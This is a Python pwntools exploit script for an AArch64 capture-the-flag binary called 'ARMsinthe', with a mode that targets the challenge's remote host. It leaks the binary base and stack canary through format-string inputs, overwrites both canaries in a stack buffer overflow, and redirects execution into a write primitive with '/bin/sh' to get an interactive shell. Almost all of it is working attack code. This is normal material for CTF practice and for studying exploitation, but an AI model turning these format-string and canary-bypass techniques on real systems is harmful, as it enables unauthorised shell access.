from pwn import *


context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF('./ARMsinthe')

gs = '''
continue
'''


def start():
    if args.GDB:
        return process(['qemu-aarch64', '-g', '1234', '-L', '/usr/aarch64-linux-gnu/', 'ARMsinthe'], level='error')
    elif args.REMOTE:
        return remote('hctf.hackappatoi.com', 10003)
    else:
        return process(['qemu-aarch64', '-L', '/usr/aarch64-linux-gnu/', 'ARMsinthe'], level='error')


def leak_base():
    p.recvuntil(b'->')
    p.sendline(b'%9$p')
    p.recvuntil(b'You said')
    leak = int(p.recvline().strip(b'\n'), 16)
    log.info('Leak %s' % hex(leak))
    e.address = leak-(e.sym['main']+148)
    log.info('Base %s' % hex(e.address))
    return e.address


def leak_canary():
    p.recvuntil(b'->')
    p.sendline(b'%13$p')
    p.recvuntil(b'You said')
    canary = int(p.recvline().strip(b'\n'), 16)
    log.info('Leak %s' % hex(canary))
    return canary


'''
Jump past the function prologue and directly into a 
write primitive

00000a54  int64_t secret(int64_t arg1)
...
<secret+20> 00000a68  010040f9   ldr     x1, [x0]
'''


def build_chain():
    chain = b'A'*64
    chain += p64(canary)  # overwrite canary in vuln()
    chain += b'B'*8
    chain += p64(e.sym['secret']+20)  # jmp to write primtive in secret
    chain += b'C'*8
    chain += p64(canary)  # overwrite canary in main()
    chain += b'D'*24
    chain += b'/bin/sh\0'  # secret() argument #1
    return chain


p = start()

leak_base()
canary = leak_canary()
chain = build_chain()

p.recvuntil(b'->')
p.sendline(chain)

p.interactive()
